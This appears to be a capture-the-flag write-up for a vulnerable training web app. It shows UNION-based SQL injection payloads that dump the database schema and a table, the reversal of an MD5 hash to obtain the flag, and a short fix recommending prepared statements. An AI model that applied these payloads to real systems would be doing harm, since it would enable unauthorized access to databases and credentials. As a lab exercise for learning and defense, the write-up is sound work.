On "Members", by passing the SQL request:
"5 or 1=1 UNION SELECT table_schema, table_name FROM INFORMATION_SCHEMA.tables"

We get the following dbs and table_name:

Member_Brute_Force.db_default
Member_Sql_Injection.users
Member_guestbook.guestbook
Member_images.list_images
Member_survey.vote_dbs

Then by passing the SQL request:
"5 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns"

We get the following columns in each tables:

table_name : db_default
column_name: id
column_name: username
column_name: password

table_name : users
column_name: user_id
column_name: first_name
column_name: last_name
column_name: town
column_name: country
column_name: planet
column_name: Commentaire
column_name: countersign

table_name : guestbook
column_name: id_comment
column_name: comment
column_name: name

table_name : list_images
column_name: id
column_name: url
column_name: title
column_name: comment

table_name : vote_dbs
column_name: id_vote
column_name: vote
column_name: nb_vote
column_name: subject

Moreover by passing the SQL request:
"5 or 1=1 UNION SELECT title, comment FROM Member_images.list_images"

We get 1 interesting result:

title: Hack me ?
comment: If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46

Finally, we use md5 reverse on "1928e8083cf461a51303633093573c46" and get "albatroz".
Last but not least, we lowercase and use sh256 on "albatroz".
And get the flag.

# RESOLUTION

- Protect string in the server to prevent from SQL injection.
- Use prepared statements and parameterized queries. (For example: PDO, MySQLi).